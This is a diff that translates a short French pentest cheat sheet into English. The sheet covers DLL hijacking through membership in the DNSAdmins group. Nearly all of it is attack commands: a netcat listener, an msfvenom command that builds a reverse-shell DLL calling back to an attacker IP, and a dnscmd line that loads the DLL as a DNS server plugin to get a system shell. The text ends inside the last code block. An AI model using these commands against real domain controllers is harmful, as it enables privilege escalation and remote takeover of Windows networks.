@@ -1,20 +1,20 @@
-# DLL Hijacking 
+# DLL Hijacking
 
-L'attaque est possible si un utilisateur du Domain fait partie du groupe `DNSAdmin`
+The attack is possible if a Domain user is part of the `DNSAdmin` group.
 
 ```sh
 rlwrap nc -nlvp 4444
 ```
 
-- Créer le payload DLL avec msfvenom et lancer un écouteur
+- Create the DLL payload with msfvenom and start a listener
 
 ```sh
-msfvenom --platforme windows -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=10.10.x.x -f dll -o evil.dll
+msfvenom --platform windows -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=10.10.x.x -f dll -o evil.dll
 ```
 
-- Se connecter au compte d'utilisateur et transféré la DLL
+- Connect to the user account and transfer the DLL
 
-- Injecter la dll dans le processus système et obenir un shell
+- Inject the dll into the system process and get a shell
 
 ```sh
 dnscmd /config /serverlevelplugindll C:\Temp\evil.dll
